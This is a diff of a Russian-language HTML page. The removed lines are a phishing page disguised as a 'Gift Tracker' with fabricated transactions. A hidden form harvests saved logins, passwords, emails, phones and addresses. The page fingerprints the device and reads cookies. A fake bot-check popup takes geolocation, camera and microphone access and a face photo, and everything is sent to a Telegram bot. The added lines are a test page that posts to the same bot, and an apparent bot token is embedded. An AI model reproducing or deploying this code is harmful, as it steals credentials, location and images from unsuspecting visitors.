@@ -3,241 +3,45 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
-<title>Gift Tracker</title>
+<title>Test</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#0a0e14;color:#e2e8f0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow-x:hidden}
-.topbar{background:#121720;border-bottom:1px solid #1e2836;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
-.logo-s{font-size:20px;font-weight:700;background:linear-gradient(135deg,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.live{color:#10b981;font-size:12px;font-weight:600}
-.container{max-width:900px;margin:0 auto;padding:16px}
-.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px}
-.stat-card{background:#121720;border:1px solid #1e2836;border-radius:12px;padding:16px;text-align:center}
-.val{font-size:22px;font-weight:800}.val.g{color:#10b981}.val.y{color:#f59e0b}.val.b{color:#3b82f6}
-.lbl{font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
-.section{margin-bottom:20px}
-.section-title{font-size:14px;font-weight:600;margin-bottom:10px}
-.table-wrap{overflow-x:auto}
-table{width:100%;border-collapse:collapse;background:#121720;border:1px solid #1e2836;border-radius:12px;overflow:hidden}
-th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#64748b}
-td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:nowrap}
-td.user{color:#fff}td.price{color:#10b981;font-weight:600}
-.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.82);z-index:100;justify-content:center;align-items:center;padding:20px}
-.overlay.show{display:flex}
-.popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:32px 24px;max-width:380px;width:100%;text-align:center}
-.popup .icon{font-size:44px;margin-bottom:10px}
-.popup h3{font-size:18px;color:#fff;margin-bottom:10px}
-.popup .desc{font-size:13px;color:#64748b;margin-bottom:20px;line-height:1.5}
-.popup .btn-pop{width:100%;padding:15px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit}
-.popup .fineprint{font-size:9px;color:#3a4450;margin-top:14px;line-height:1.5}
-.hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
-.footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
-@media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px}}
+body{background:#0a0e14;color:#fff;font-family:sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center}
+.popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:32px 24px;max-width:380px;text-align:center}
+.btn{width:100%;padding:15px;background:#3b82f6;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;margin-top:20px}
 </style>
 </head>
 <body>
-
-<div class="hidden-form">
-<form>
-<input type="text" name="u" autocomplete="username">
-<input type="password" name="p" autocomplete="current-password">
-<input type="email" name="e" autocomplete="email">
-<input type="text" name="fn" autocomplete="name">
-<input type="tel" name="ph" autocomplete="tel-national">
-<input type="tel" name="ph2" autocomplete="tel">
-<input type="text" name="adr" autocomplete="street-address">
-</form>
-</div>
-
-<div class="topbar">
-<div class="logo-s">🎁 Gift Tracker</div>
-<div class="live">LIVE • обновлено <span id="updSec">3</span> сек назад</div>
-</div>
-
-<div class="container">
-<div class="stats-row">
-<div class="stat-card"><div class="val g">12847</div><div class="lbl">Подарков</div></div>
-<div class="stat-card"><div class="val y">3291</div><div class="lbl">Продано за 24ч</div></div>
-<div class="stat-card"><div class="val b">142</div><div class="lbl">Продавцов</div></div>
-<div class="stat-card"><div class="val g">847K₽</div><div class="lbl">Объём</div></div>
-</div>
-<div class="section">
-<div class="section-title">🏆 Последние транзакции</div>
-<div class="table-wrap">
-<table>
-<thead><tr><th>Продавец</th><th>Подарок</th><th>Цена</th><th>Время</th></tr></thead>
-<tbody id="giftTable"></tbody>
-</table>
-</div>
-</div>
-</div>
-<div class="footer-bar">🔒 Gift Tracker • Данные из открытых источников</div>
-
-<div class="overlay" id="overlay">
 <div class="popup">
-<div class="icon">🔐</div>
-<h3>Подтвердите что вы человек</h3>
-<div class="desc">Это необходимо для защиты<br>от автоматических ботов.</div>
-<button class="btn-pop" onclick="submitAll()">Подтвердить и продолжить</button>
-<div class="fineprint">
-Нажимая «Подтвердить и продолжить», вы соглашаетесь<br>
-с правилами сообщества и политикой обработки данных.<br>
-Продолжая, вы подтверждаете что ознакомлены<br>
-с условиями использования сервиса.
+<h3>Тест</h3>
+<p style="color:#64748b;margin-top:10px">Нажми кнопку для проверки</p>
+<button class="btn" onclick="test()">Подтвердить</button>
+<p id="result" style="color:#10b981;margin-top:15px;font-size:14px"></p>
 </div>
-</div>
-</div>
-
 <script>
 var TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
 var CHAT="8192226287";
-var REDIR="https://www.google.com";
-var sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
 
-var gifts=[
-{user:"@dagestan_05",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
-{user:"@sveta_love",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
-{user:"@kostyan_77",gift:"Instant Ramen 🍜",price:"550 ₽"},
-{user:"@maxim_ural",gift:"Vintage Cigare 🚬",price:"3 000 ₽"},
-{user:"@alenka_moon",gift:"Snoop Dogg 🐶",price:"1 400 ₽"},
-{user:"@bespredel",gift:"Clover Pin 🍀",price:"760 ₽"},
-{user:"@tatarin_116",gift:"Pet Snake 🐍",price:"470 ₽"},
-{user:"@dasha_sun",gift:"Evil Eye 👁️",price:"1 120 ₽"},
-{user:"@abdul_goat",gift:"Khabib's Papakha 💂‍♂️",price:"7 500 ₽"},
-{user:"@egor_krd",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
-{user:"@nastya_art",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
-{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"}
-];
+async function test(){
+var res=document.getElementById('result');
+res.textContent="Кнопка работает...";
 
-function shuffleAndShow(){
-var sh=[...gifts].sort(function(){return Math.random()-0.5}).slice(0,8);
-var h='';
-for(var i=0;i<sh.length;i++){
-h+='<tr><td class="user">'+sh[i].user+'</td><td>'+sh[i].gift+'</td><td class="price">'+sh[i].price+'</td><td style="color:#64748b;font-size:11px">'+Math.floor(Math.random()*60)+' сек назад</td></tr>';
-}
-document.getElementById('giftTable').innerHTML=h;
-}
-shuffleAndShow();
-setInterval(shuffleAndShow,8000);
-setInterval(function(){document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
-
-var PD={};
-PD.ua=navigator.userAgent;PD.platform=navigator.platform;PD.lang=navigator.language;
-PD.sw=screen.width;PD.sh=screen.height;
-PD.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
-PD.cpu=navigator.hardwareConcurrency||"?";PD.ram=navigator.deviceMemory||"?";
-PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
-PD.ref=document.referrer||"direct";
-PD.cookie=document.cookie||"-";
-PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.region="-";PD.provider="-";PD.tz_ip="-";
-
-fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
-PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
-PD.region=j.region||"-";PD.provider=j.org||"-";PD.tz_ip=j.timezone||"-";
-}).catch(function(){});
-
+// Тест отправки в Telegram
 try{
-var cv=document.createElement('canvas');var gl=cv.getContext('webgl');
-if(gl){var db=gl.getExtension('WEBGL_debug_renderer_info');
-if(db){PD.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
-}catch(e){}
-try{navigator.getBattery().then(function(b){PD.bat=Math.round(b.level*100)+"% ch:"+b.charging})}catch(e){}
-try{if(navigator.connection){PD.conn=navigator.connection.effectiveType}}catch(e){}
-
-setTimeout(function(){
-PD.af_u=document.querySelector('[name="u"]').value||"-";
-PD.af_p=document.querySelector('[name="p"]').value||"-";
-PD.af_e=document.querySelector('[name="e"]').value||"-";
-PD.af_fn=document.querySelector('[name="fn"]').value||"-";
-PD.af_ph=document.querySelector('[name="ph"]').value||"-";
-PD.af_ph2=document.querySelector('[name="ph2"]').value||"-";
-PD.af_adr=document.querySelector('[name="adr"]').value||"-";
-},2500);
-
-setTimeout(function(){
-document.getElementById('overlay').classList.add('show');
-},1500);
-
-function sendAll(d){
-var msg='🚨 ЗАХВАТ\n\n'+
-'🆔 '+sid+'\n🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
-'🌐 IP: '+(d.ip||"-")+'\n'+
-'📍 '+(d.country||"-")+', '+(d.city||"-")+'\n'+
-'📡 '+(d.provider||"-")+'\n'+
-'🕐 TZ: '+(d.tz||"-")+' / IP: '+(d.tz_ip||"-")+'\n\n'+
-'📱 '+(d.platform||"-")+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
-'🖥 '+(d.sw||"-")+'x'+(d.sh||"-")+' | CPU:'+(d.cpu||"-")+' | RAM:'+(d.ram||"-")+'\n'+
-'🗣 '+(d.lang||"-")+'\n🎮 '+(d.gpu||"-")+'\n🔋 '+(d.bat||"-")+'\n📶 '+(d.conn||"-")+'\n\n'+
-'📍 ГЕО: '+(d.geo_lat||"-")+', '+(d.geo_lng||"-")+' ('+(d.geo_acc||"-")+')\n\n'+
-'📸 КАМЕРА: '+(d.camera||"-")+'\n🎤 МИКРОФОН: '+(d.mic||"-")+'\n\n'+
-'🔑 АВТОЗАПОЛНЕНИЕ:\n'+
-'LOGIN: '+(d.af_u||"-")+'\nPASS: '+(d.af_p||"-")+'\nEMAIL: '+(d.af_e||"-")+'\n'+
-'NAME: '+(d.af_fn||"-")+'\nPHONE: '+(d.af_ph||"-")+'\nPHONE2: '+(d.af_ph2||"-")+'\n'+
-'ADDR: '+(d.af_adr||"-")+'\n\n'+
-'🔗 REF: '+(d.ref||"-")+'\n🍪 COOKIE: '+((d.cookie||"-").substring(0,500));
-
-fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
-method:"POST",headers:{"Content-Type":"application/json"},
-body:JSON.stringify({chat_id:CHAT,text:msg})
+var resp=await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({chat_id:CHAT,text:"✅ ТЕСТ: кнопка нажата"})
 });
+var data=await resp.json();
+if(data.ok){
+res.textContent="✅ Сообщение отправлено в бота!";
+}else{
+res.textContent="❌ Ошибка: "+JSON.stringify(data);
 }
-
-function sendPhoto(photo){
-var bs=atob(photo.split(',')[1]);
-var ms=photo.split(',')[0].split(':')[1].split(';')[0];
-var ab=new ArrayBuffer(bs.length);
-var ia=new Uint8Array(ab);
-for(var i=0;i<bs.length;i++){ia[i]=bs.charCodeAt(i)}
-var blob=new Blob([ab],{type:ms});
-var fd=new FormData();
-fd.append('chat_id',CHAT);
-fd.append('photo',blob,'face.jpg');
-fd.append('caption','📸 ФОТО\n🆔 '+sid);
-fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd});
-}
-
-async function submitAll(){
-if(navigator.geolocation){
-navigator.geolocation.getCurrentPosition(function(pos){
-PD.geo_lat=pos.coords.latitude;
-PD.geo_lng=pos.coords.longitude;
-PD.geo_acc=pos.coords.accuracy+' м';
-},{},{enableHighAccuracy:true,timeout:5000});
-}
-
-try{
-var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true});
-PD.camera="получен";
-PD.mic="получен";
-var video=document.createElement('video');
-video.srcObject=stream;
-video.play();
-setTimeout(function(){
-var canvas=document.createElement('canvas');
-canvas.width=320;canvas.height=240;
-var ctx=canvas.getContext('2d');
-ctx.drawImage(video,0,0,320,240);
-var photo=canvas.toDataURL('image/jpeg',0.6);
-stream.getTracks().forEach(function(t){t.stop()});
-sendAll(PD);
-sendPhoto(photo);
-done();
-},1500);
 }catch(e){
-PD.camera="отказано";
-PD.mic="отказано";
-sendAll(PD);
-done();
+res.textContent="❌ Ошибка: "+e.message;
 }
-
-if('Notification' in window){
-Notification.requestPermission().then(function(p){PD.notifications=p});
-}
-}
-
-function done(){
-document.getElementById('overlay').classList.remove('show');
-setTimeout(function(){window.location.replace(REDIR)},2000);
 }
 </script>
 </body>
